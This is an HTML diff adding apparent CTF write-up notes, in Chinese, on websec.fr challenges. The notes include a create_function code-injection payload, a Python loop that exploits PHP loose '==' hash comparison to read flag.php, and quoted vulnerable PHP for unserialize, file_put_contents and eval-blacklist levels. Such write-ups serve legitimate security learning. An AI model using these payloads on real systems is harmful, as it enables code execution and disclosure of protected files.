@@ -84,7 +84,7 @@
             <h1>Websec 刷题</h1>
             <span class="meta">
             	Posted on
-              2020-04-26，3 min read
+              2020-04-26，5 min read
             </span>
           </div>
         </div>
@@ -197,6 +197,91 @@ include $_GET['page'] . '.txt';
 <h1 id="level08">Level08</h1>
 <p>文件上传。传完会包含<br>
 传个图片马就行。</p>
+<h1 id="level15">Level15</h1>
+<p>create_function代码注入</p>
+<pre><code>;}print_r($flag);//
+</code></pre>
+<h1 id="level20">Level20</h1>
+<p>反序列化</p>
+<pre><code>class Flag {
+    public function __destruct() {
+       global $flag;
+       echo $flag; 
+    }
+}
+
+function sanitize($data) {
+    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
+    if ( ! preg_match ('/[A-Z]:/', $data)) {
+        return unserialize ($data);
+    }
+
+    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:&quot;/', $data )) {
+        return unserialize ($data);
+    }
+
+    return false;
+}
+</code></pre>
+<p>暂时不知道原理。</p>
+<h1 id="level10">Level10</h1>
+<pre><code>&lt;?php
+        if (isset ($_REQUEST['f']) &amp;&amp; isset ($_REQUEST['hash'])) {
+            $file = $_REQUEST['f'];
+            $request = $_REQUEST['hash'];
+
+            $hash = substr (md5 ($flag . $file . $flag), 0, 8);
+
+            echo '&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;';
+            if ($request == $hash) {
+            show_source ($file);
+            } else {
+            echo 'Permission denied!';
+            }
+            echo '&lt;/pre&gt;&lt;/div&gt;';
+        }
+        ?&gt;
+</code></pre>
+<p>取md5前8位。进行比较。<br>
+由于我们不知道$flag是啥。无法知道密文结果。<br>
+但下面比较用的是双等。可能存在弱类型</p>
+<pre><code>import requests
+for a in range(1,1000):
+    url='http://websec.fr/level10/index.php?f='+str('.'+'/'*a+'flag.php')+'&amp;hash=0e12345'
+    result=requests.get(url=url).text
+    if 'WEBSEC{' in result:
+        print(result)
+        break
+</code></pre>
+<p>./////881个/flag.php</p>
+<h1 id="level24">Level24</h1>
+<pre><code>if (isset($_GET['p']) &amp;&amp; isset($_GET['filename']) ) {
+    $filename = $_GET['filename'];
+    if ($_GET['p'] === &quot;edit&quot;) {
+        $p = &quot;edit&quot;;
+        if (isset($_POST['data'])) {
+            $data = $_POST['data'];
+            if (strpos($data, '&lt;?')  === false &amp;&amp; stripos($data, 'script')  === false) {  # no interpretable code please.
+                file_put_contents($_GET['filename'], $data);
+                die ('&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;');
+            }
+        } elseif (file_exists($_GET['filename'])){
+            $data = file_get_contents($_GET['filename']);
+        }
+    }
+}
+</code></pre>
+<p>file_put_contents。文件名没过滤。内容进行了过滤<br>
+可以配合伪协议写入<br>
+<img src="https://guokeya.github.io/post-images/1588082045331.png" alt="" loading="lazy"></p>
+<h1 id="level22">Level22</h1>
+<pre><code>$funcs_internal = get_defined_functions()['internal'];
+$funcs_extra = array ('eval', 'include', 'require', 'function');
+$funny_chars = array ('\.', '\+', '-', '&quot;', ';', '`', '\[', '\]');
+$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');
+$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);
+</code></pre>
+<p>我们输入的东西不能是以上内容。最后会eval执行</p>
 
           
           <p class="next-post">下一篇：
